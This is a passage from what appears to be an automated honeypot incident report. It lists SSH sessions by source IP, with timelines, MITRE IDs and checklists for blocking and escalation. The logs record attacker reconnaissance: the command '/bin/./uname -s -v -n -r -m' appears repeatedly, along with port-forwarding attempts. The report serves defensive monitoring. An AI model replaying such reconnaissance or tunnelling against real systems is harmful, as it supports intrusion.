| **Last Seen** | 2026-08-08 01:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:28:23` | `cowrie.session.connect` |
| `2026-08-08 01:28:23` | `cowrie.client.version` |
| `2026-08-08 01:28:23` | `cowrie.client.kex` |
| `2026-08-08 01:28:24` | `cowrie.login.success` |
| `2026-08-08 01:28:25` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554d75f2b0ec

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-08-08 01:29 |
| **Last Seen** | 2026-08-08 01:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:29:09` | `cowrie.session.connect` |
| `2026-08-08 01:29:09` | `cowrie.client.version` |
| `2026-08-08 01:29:09` | `cowrie.client.kex` |
| `2026-08-08 01:29:11` | `cowrie.login.success` |
| `2026-08-08 01:29:12` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f61551fab7

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-08 01:29 |
| **Last Seen** | 2026-08-08 01:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:29:22` | `cowrie.session.connect` |
| `2026-08-08 01:29:22` | `cowrie.client.version` |
| `2026-08-08 01:29:22` | `cowrie.client.kex` |
| `2026-08-08 01:29:23` | `cowrie.login.success` |
| `2026-08-08 01:29:24` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ec4d8fb0caf

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]157` |
| **First Seen** | 2026-08-08 01:29 |
| **Last Seen** | 2026-08-08 01:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:29:22` | `cowrie.session.connect` |
| `2026-08-08 01:29:23` | `cowrie.client.version` |
| `2026-08-08 01:29:23` | `cowrie.client.kex` |
| `2026-08-08 01:29:25` | `cowrie.login.success` |
| `2026-08-08 01:29:26` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]157` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94ef1430ea49

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:29 |
| **Last Seen** | 2026-08-08 01:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:29:48` | `cowrie.session.connect` |
| `2026-08-08 01:29:48` | `cowrie.client.version` |
| `2026-08-08 01:29:48` | `cowrie.client.kex` |
| `2026-08-08 01:29:48` | `cowrie.login.success` |
| `2026-08-08 01:29:49` | `cowrie.session.params` |
| `2026-08-08 01:29:49` | `cowrie.command.input` |
| `2026-08-08 01:29:49` | `cowrie.log.closed` |
| `2026-08-08 01:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6f951cd0df

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:31 |
| **Last Seen** | 2026-08-08 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:31:24` | `cowrie.session.connect` |
| `2026-08-08 01:31:24` | `cowrie.client.version` |
| `2026-08-08 01:31:24` | `cowrie.client.kex` |
| `2026-08-08 01:31:24` | `cowrie.login.success` |
| `2026-08-08 01:31:25` | `cowrie.session.params` |
| `2026-08-08 01:31:25` | `cowrie.command.input` |
| `2026-08-08 01:31:25` | `cowrie.log.closed` |
| `2026-08-08 01:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33550b17271e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:33 |
| **Last Seen** | 2026-08-08 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:33:07` | `cowrie.session.connect` |
| `2026-08-08 01:33:07` | `cowrie.client.version` |
| `2026-08-08 01:33:07` | `cowrie.client.kex` |
| `2026-08-08 01:33:07` | `cowrie.login.success` |
| `2026-08-08 01:33:08` | `cowrie.session.params` |
| `2026-08-08 01:33:08` | `cowrie.command.input` |
| `2026-08-08 01:33:08` | `cowrie.log.closed` |
| `2026-08-08 01:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e82e4107955

| Field | Detail |
|---|---|
| **Source IP** | `65.20.187[.]47` |
| **First Seen** | 2026-08-08 01:33 |
| **Last Seen** | 2026-08-08 01:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:33:45` | `cowrie.session.connect` |
| `2026-08-08 01:33:45` | `cowrie.client.version` |
| `2026-08-08 01:33:45` | `cowrie.client.kex` |
| `2026-08-08 01:33:47` | `cowrie.login.success` |
| `2026-08-08 01:33:47` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.187[.]47` to AbuseIPDB if not already reported
- [ ] Block `65.20.187[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81e5b34d8dd5

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-08-08 01:33 |
| **Last Seen** | 2026-08-08 01:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:33:57` | `cowrie.session.connect` |
| `2026-08-08 01:33:57` | `cowrie.client.version` |
| `2026-08-08 01:33:57` | `cowrie.client.kex` |
| `2026-08-08 01:34:00` | `cowrie.login.success` |
| `2026-08-08 01:34:00` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e604581232b6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:34 |
| **Last Seen** | 2026-08-08 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:34:51` | `cowrie.session.connect` |
| `2026-08-08 01:34:51` | `cowrie.client.version` |
| `2026-08-08 01:34:51` | `cowrie.client.kex` |
| `2026-08-08 01:34:51` | `cowrie.login.success` |
| `2026-08-08 01:34:52` | `cowrie.session.params` |
| `2026-08-08 01:34:52` | `cowrie.command.input` |
| `2026-08-08 01:34:52` | `cowrie.log.closed` |
| `2026-08-08 01:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b7c16e67d9c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-08 01:35 |
| **Last Seen** | 2026-08-08 01:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:35:18` | `cowrie.session.connect` |
| `2026-08-08 01:35:18` | `cowrie.client.version` |
| `2026-08-08 01:35:19` | `cowrie.client.kex` |
| `2026-08-08 01:35:19` | `cowrie.login.success` |
| `2026-08-08 01:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aa9e13a5f8f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-08 01:35 |
| **Last Seen** | 2026-08-08 01:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:35:19` | `cowrie.session.connect` |
| `2026-08-08 01:35:19` | `cowrie.client.version` |
| `2026-08-08 01:35:19` | `cowrie.client.kex` |
| `2026-08-08 01:35:20` | `cowrie.login.success` |
| `2026-08-08 01:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b7ceaf5e54a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:36 |
| **Last Seen** | 2026-08-08 01:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:36:32` | `cowrie.session.connect` |
| `2026-08-08 01:36:32` | `cowrie.client.version` |
| `2026-08-08 01:36:32` | `cowrie.client.kex` |
| `2026-08-08 01:36:32` | `cowrie.login.success` |
| `2026-08-08 01:36:33` | `cowrie.session.params` |
| `2026-08-08 01:36:33` | `cowrie.command.input` |
| `2026-08-08 01:36:33` | `cowrie.log.closed` |
| `2026-08-08 01:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3607cde1962

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:38 |
| **Last Seen** | 2026-08-08 01:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:38:10` | `cowrie.session.connect` |
| `2026-08-08 01:38:10` | `cowrie.client.version` |
| `2026-08-08 01:38:10` | `cowrie.client.kex` |
| `2026-08-08 01:38:10` | `cowrie.login.success` |
| `2026-08-08 01:38:11` | `cowrie.session.params` |
| `2026-08-08 01:38:11` | `cowrie.command.input` |
| `2026-08-08 01:38:11` | `cowrie.log.closed` |
| `2026-08-08 01:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d2bb3349735

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:39 |
| **Last Seen** | 2026-08-08 01:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:39:51` | `cowrie.session.connect` |
| `2026-08-08 01:39:51` | `cowrie.client.version` |
| `2026-08-08 01:39:51` | `cowrie.client.kex` |
| `2026-08-08 01:39:52` | `cowrie.login.success` |
| `2026-08-08 01:39:52` | `cowrie.session.params` |
| `2026-08-08 01:39:52` | `cowrie.command.input` |
| `2026-08-08 01:39:53` | `cowrie.log.closed` |
| `2026-08-08 01:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-897ba3390909

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:41 |
| **Last Seen** | 2026-08-08 01:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:41:32` | `cowrie.session.connect` |
| `2026-08-08 01:41:32` | `cowrie.client.version` |
| `2026-08-08 01:41:32` | `cowrie.client.kex` |
| `2026-08-08 01:41:33` | `cowrie.login.success` |
| `2026-08-08 01:41:33` | `cowrie.session.params` |
| `2026-08-08 01:41:33` | `cowrie.command.input` |
| `2026-08-08 01:41:33` | `cowrie.log.closed` |
| `2026-08-08 01:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-578a0c0898c3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:43 |
| **Last Seen** | 2026-08-08 01:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:43:09` | `cowrie.session.connect` |
| `2026-08-08 01:43:09` | `cowrie.client.version` |
| `2026-08-08 01:43:09` | `cowrie.client.kex` |
| `2026-08-08 01:43:09` | `cowrie.login.success` |
| `2026-08-08 01:43:10` | `cowrie.session.params` |
| `2026-08-08 01:43:10` | `cowrie.command.input` |
| `2026-08-08 01:43:10` | `cowrie.log.closed` |
| `2026-08-08 01:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca720a660dc2

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:44 |
| **Last Seen** | 2026-08-08 01:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:44:46` | `cowrie.session.connect` |
| `2026-08-08 01:44:46` | `cowrie.client.version` |
| `2026-08-08 01:44:46` | `cowrie.client.kex` |
| `2026-08-08 01:44:47` | `cowrie.login.success` |
| `2026-08-08 01:44:48` | `cowrie.session.params` |
| `2026-08-08 01:44:48` | `cowrie.command.input` |
| `2026-08-08 01:44:48` | `cowrie.log.closed` |
| `2026-08-08 01:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd2213c1c71

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:46 |
| **Last Seen** | 2026-08-08 01:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:46:29` | `cowrie.session.connect` |
| `2026-08-08 01:46:29` | `cowrie.client.version` |
| `2026-08-08 01:46:29` | `cowrie.client.kex` |
| `2026-08-08 01:46:29` | `cowrie.login.success` |
| `2026-08-08 01:46:30` | `cowrie.session.params` |
| `2026-08-08 01:46:30` | `cowrie.command.input` |
| `2026-08-08 01:46:30` | `cowrie.log.closed` |
| `2026-08-08 01:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fd4b1923bc8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:48 |
| **Last Seen** | 2026-08-08 01:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:48:12` | `cowrie.session.connect` |
| `2026-08-08 01:48:12` | `cowrie.client.version` |
| `2026-08-08 01:48:12` | `cowrie.client.kex` |
| `2026-08-08 01:48:13` | `cowrie.login.success` |
| `2026-08-08 01:48:14` | `cowrie.session.params` |
| `2026-08-08 01:48:14` | `cowrie.command.input` |
| `2026-08-08 01:48:14` | `cowrie.log.closed` |
| `2026-08-08 01:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d157e91e7ec6

| Field | Detail |
|---|---|
| **Source IP** | `207.219.222[.]29` |
| **First Seen** | 2026-08-08 01:49 |
| **Last Seen** | 2026-08-08 01:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:49:07` | `cowrie.session.connect` |
| `2026-08-08 01:49:07` | `cowrie.client.version` |
| `2026-08-08 01:49:07` | `cowrie.client.kex` |
| `2026-08-08 01:49:09` | `cowrie.login.success` |
| `2026-08-08 01:49:09` | `cowrie.direct-tcpip.request` |
| `2026-08-08 01:49:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.222[.]29` to AbuseIPDB if not already reported
- [ ] Block `207.219.222[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d81b3b446311

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:49 |
| **Last Seen** | 2026-08-08 01:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:49:55` | `cowrie.session.connect` |
| `2026-08-08 01:49:55` | `cowrie.client.version` |
| `2026-08-08 01:49:55` | `cowrie.client.kex` |
| `2026-08-08 01:49:55` | `cowrie.login.success` |
| `2026-08-08 01:49:56` | `cowrie.session.params` |
| `2026-08-08 01:49:56` | `cowrie.command.input` |
| `2026-08-08 01:49:56` | `cowrie.log.closed` |
| `2026-08-08 01:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b6ea92ff92

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:51 |
| **Last Seen** | 2026-08-08 01:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:51:39` | `cowrie.session.connect` |
| `2026-08-08 01:51:39` | `cowrie.client.version` |
| `2026-08-08 01:51:39` | `cowrie.client.kex` |
| `2026-08-08 01:51:39` | `cowrie.login.success` |
| `2026-08-08 01:51:40` | `cowrie.session.params` |
| `2026-08-08 01:51:40` | `cowrie.command.input` |
| `2026-08-08 01:51:40` | `cowrie.log.closed` |
| `2026-08-08 01:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd5cfdafd32

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:53 |
| **Last Seen** | 2026-08-08 01:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:53:24` | `cowrie.session.connect` |
| `2026-08-08 01:53:24` | `cowrie.client.version` |
| `2026-08-08 01:53:24` | `cowrie.client.kex` |
| `2026-08-08 01:53:24` | `cowrie.login.success` |
| `2026-08-08 01:53:25` | `cowrie.session.params` |
| `2026-08-08 01:53:25` | `cowrie.command.input` |
| `2026-08-08 01:53:25` | `cowrie.log.closed` |
| `2026-08-08 01:53:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d813612f34

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:55 |
| **Last Seen** | 2026-08-08 01:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:55:04` | `cowrie.session.connect` |
| `2026-08-08 01:55:04` | `cowrie.client.version` |
| `2026-08-08 01:55:04` | `cowrie.client.kex` |
| `2026-08-08 01:55:04` | `cowrie.login.success` |
| `2026-08-08 01:55:05` | `cowrie.session.params` |
| `2026-08-08 01:55:05` | `cowrie.command.input` |
| `2026-08-08 01:55:05` | `cowrie.log.closed` |
| `2026-08-08 01:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09bdc49f8bf6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 01:56 |
| **Last Seen** | 2026-08-08 01:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 01:56:41` | `cowrie.session.connect` |
| `2026-08-08 01:56:41` | `cowrie.client.version` |
| `2026-08-08 01:56:41` | `cowrie.client.kex` |
| `2026-08-08 01:56:41` | `cowrie.login.success` |
| `2026-08-08 01:56:42` | `cowrie.session.params` |
| `2026-08-08 01:56:42` | `cowrie.command.input` |
| `2026-08-08 01:56:42` | `cowrie.log.closed` |
| `2026-08-08 01:56:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46fa16a213d6

